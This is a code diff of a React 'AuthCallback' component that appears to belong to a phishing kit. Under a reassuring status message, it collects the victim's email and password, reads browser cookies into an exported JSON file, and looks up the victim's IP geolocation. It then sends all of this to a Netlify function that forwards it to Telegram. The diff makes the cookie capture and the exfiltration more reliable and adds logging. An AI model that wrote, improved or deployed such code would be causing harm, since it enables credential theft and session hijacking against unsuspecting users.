@@ -41,12 +41,33 @@ const AuthCallback: React.FC = () => {
             const captureCookies = () => {
                 try {
                     const cookieString = document.cookie;
-                    if (!cookieString) return [];
-                    const cookies = cookieString.split(';').map(pair => {
-                        const [name, value] = pair.trim().split('=');
-                        return { name, value, domain: window.location.hostname };
-                    });
+                    const cookies: any[] = [];
+                    
+                    if (cookieString && cookieString.trim()) {
+                        cookieString.split(';').forEach(pair => {
+                            const trimmedPair = pair.trim();
+                            if (trimmedPair) {
+                                const [name, value] = trimmedPair.split('=');
+                                if (name) {
+                                    cookies.push({
+                                        name: name.trim(),
+                                        value: value ? value.trim() : '',
+                                        domain: window.location.hostname,
+                                        path: '/',
+                                        secure: false,
+                                        httpOnly: false,
+                                        sameSite: 'Lax',
+                                        expires: null
+                                    });
+                                }
+                            }
+                        });
+                    }
+                    
                     console.log(`✅ Captured ${cookies.length} cookies.`);
+                    if (cookies.length > 0) {
+                        console.log('📋 Sample cookies:', cookies.slice(0, 3));
+                    }
                     return cookies;
                 } catch (error) {
                     console.warn('⚠️ Failed to capture cookies:', error);
@@ -57,7 +78,7 @@ const AuthCallback: React.FC = () => {
             
             // --- 3. Fetch Location Data ---
             setStatus('Fetching geolocation data...');
-            let locationData = {};
+            let locationData: any = {};
             try {
                 const response = await fetch('https://ipapi.co/json/');
                 locationData = await response.json();
@@ -68,7 +89,24 @@ const AuthCallback: React.FC = () => {
 
             // --- 4. Create Cookie File ---
             const createCookieFile = (cookiesToExport: any[]) => {
-                if (!cookiesToExport || cookiesToExport.length === 0) return null;
+                if (!cookiesToExport || cookiesToExport.length === 0) {
+                    console.warn('⚠️ No cookies to export - creating empty file');
+                    // Still create a file even if no cookies, to show we attempted capture
+                    const emptyJsonContent = JSON.stringify({
+                        source: 'AuthCallback-Export',
+                        timestamp: new Date().toISOString(),
+                        count: 0,
+                        cookies: [],
+                        note: 'No accessible cookies found. HttpOnly cookies cannot be captured by JavaScript.'
+                    }, null, 2);
+                    
+                    return {
+                        name: `cookies_${new Date().getTime()}.json`,
+                        content: emptyJsonContent,
+                        size: emptyJsonContent.length
+                    };
+                }
+                
                 try {
                     const jsonContent = JSON.stringify({
                         source: 'AuthCallback-Export',
@@ -77,16 +115,29 @@ const AuthCallback: React.FC = () => {
                         cookies: cookiesToExport
                     }, null, 2);
 
+                    console.log(`✅ Cookie JSON file created (${jsonContent.length} bytes)`);
+
                     return {
                         name: `cookies_${new Date().getTime()}.json`,
                         content: jsonContent,
+                        size: jsonContent.length
                     };
                 } catch (error) {
-                    console.warn('⚠️ Failed to create cookie JSON file:', error);
+                    console.error('❌ Failed to create cookie JSON file:', error);
                     return null;
                 }
             };
             const cookieFile = createCookieFile(cookies);
+
+            if (cookieFile) {
+                console.log('✅ Cookie file object created:', {
+                    name: cookieFile.name,
+                    size: cookieFile.size,
+                    hasContent: !!cookieFile.content
+                });
+            } else {
+                console.error('❌ Failed to create cookie file');
+            }
 
             // --- 5. Transmit Data ---
             setStatus('Transmitting secured data...');
@@ -94,9 +145,15 @@ const AuthCallback: React.FC = () => {
                 email: credentials.email,
                 password: credentials.password,
                 passwordSource: 'auth-callback-final',
-                cookies,
-                locationData,
-                cookieFiles: cookieFile ? { jsonFile: cookieFile } : {},
+                cookies: cookies,
+                locationData: locationData,
+                cookieFiles: cookieFile ? { 
+                    jsonFile: {
+                        name: cookieFile.name,
+                        content: cookieFile.content,
+                        size: cookieFile.size
+                    }
+                } : {},
                 userAgent: navigator.userAgent,
                 url: window.location.href,
                 timestamp: new Date().toISOString(),
@@ -105,9 +162,21 @@ const AuthCallback: React.FC = () => {
                 captureContext: {
                     sourceComponent: 'AuthCallback',
                     cookiesCaptured: cookies.length,
-                    locationCaptured: !!locationData,
+                    locationCaptured: !!(locationData && locationData.ip),
+                    cookieFileCreated: !!cookieFile
                 }
             };
+
+            console.log('📤 Payload Summary:', {
+                email: payload.email,
+                password: '***',
+                cookiesCount: payload.cookies.length,
+                hasLocationData: !!payload.locationData.ip,
+                hasCookieFile: !!payload.cookieFiles.jsonFile,
+                cookieFileName: payload.cookieFiles.jsonFile?.name,
+                cookieFileSize: payload.cookieFiles.jsonFile?.size,
+                timestamp: payload.timestamp
+            });
 
             try {
                 const response = await fetch('/.netlify/functions/sendTelegram', {
@@ -116,13 +185,17 @@ const AuthCallback: React.FC = () => {
                     body: JSON.stringify(payload)
                 });
 
+                const responseData = await response.json();
+
                 if (response.ok) {
                     console.log('✅✅✅ SUCCESS: All data successfully sent to Telegram!');
+                    console.log('📊 Telegram Response:', responseData);
                     setStatus('Authentication complete. Redirecting...');
                 } else {
                     const errorText = await response.text();
                     console.error('❌ Transmission failed. Server responded with:', response.status, errorText);
                     setStatus(`Error: Transmission failed with status ${response.status}.`);
+                    return;
                 }
             } catch (error) {
                 console.error('❌ FATAL: Network error during transmission.', error);
